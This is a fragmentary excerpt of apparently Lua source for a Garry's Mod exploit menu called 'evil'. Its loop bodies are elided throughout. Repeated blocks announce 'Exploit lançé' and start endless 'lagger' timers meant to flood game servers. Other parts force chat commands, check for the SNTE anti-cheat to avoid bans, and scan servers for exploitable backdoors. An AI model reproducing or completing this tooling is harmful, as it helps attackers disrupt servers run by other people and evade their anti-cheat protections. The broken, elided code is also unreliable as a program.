surface.PlaySound( "mat/evilclick.wav" ) NOTIFICATION("Exploit lançé") timer.Create("lagger32", 0, 0, function()
for i = 1, 1000 do
...
surface.PlaySound( "mat/evilclick.wav" ) NOTIFICATION("Exploit lançé") timer.Create("lagger33", 0, 0, function()
for i = 1, 1000 do
...
surface.PlaySound( "mat/evilclick.wav" ) NOTIFICATION("Exploit lançé") timer.Create("lagger35", 0, 0, function()
for i = 1, 1000 do
...
surface.PlaySound( "mat/evilclick.wav" ) NOTIFICATION("Exploit lançé") timer.Create("lagger36", 0, 0, function()
for i = 1, 1000 do
...
surface.PlaySound( "mat/evilclick.wav" ) NOTIFICATION("Exploit lançé") timer.Create("lagger37", 0, 0, function()
for i = 1, 1000 do
...
surface.PlaySound( "mat/evilclick.wav" ) NOTIFICATION("Exploit lançé") timer.Create("lagger38", 0, 0, function()
for i = 1, 1000 do
...
surface.PlaySound( "mat/evilclick.wav" ) NOTIFICATION("Exploit lançé") timer.Create("lagger39", 0, 0, function()
for i = 1, 1000 do
...
surface.PlaySound( "mat/evilclick.wav" ) NOTIFICATION("Exploit lançé") timer.Create("lagger40", 0, 0, function()
for i = 1, 1000 do
...
surface.PlaySound( "mat/evilclick.wav" ) NOTIFICATION("Exploit lançé") timer.Create("lagger41", 0, 0, function()
for i = 1, 2000 do
...
surface.PlaySound( "mat/evilclick.wav" ) NOTIFICATION("Exploit lançé") timer.Create("lagger42", 0, 0, function()
for i = 1, 2000 do
...
TextEntry.OnEnter = function( self )
surface.PlaySound( "mat/evilclick.wav" ) NOTIFICATION("Exploit lançé") timer.Create("ofn", 0.2, 0, function()
...
surface.PlaySound( "mat/evilclick.wav" ) NOTIFICATION("Exploit lançé") RunConsoleCommand("say", "izi")
...
surface.PlaySound( "mat/evilclick.wav" ) NOTIFICATION("Exploit lançé") function permaknifepls(ply,cmd,args,argStr)
local ply = LocalPlayer()
...
draw.SimpleText("SNTE détecté. Risque de ban", "evil_home3", 330, 235, Color(255, 74, 74,255), 0, 1)
draw.SimpleText("Exploits désactivés", "evil_home2", 440, 265, Color(255, 255, 255,200), 0, 1)
end
end
end
...
triggeringbd = "Mining"
chat.AddText( Color( 0, 0, 0 ), "[evil]", Color( 81, 96, 255 )," Backdoor Trouvé : "..triggeringbd )
else
end
...
chat.AddText( Color( 0, 0, 0 ), "[evil]", Color( 255, 74, 74 )," Backdoor Trouvé : "..triggeringbd )else
...
chat.AddText( Color( 0, 0, 0 ), "[evil]", Color( 255, 74, 74 )," Backdoor Trouvé : "..triggeringbd )
else
end
...
--chat.AddText(Color(0, 0, 0), "[", "evil", "] ", Color( 255, 0, 0 ), "Aucune backdoor présente" )
--else
--end
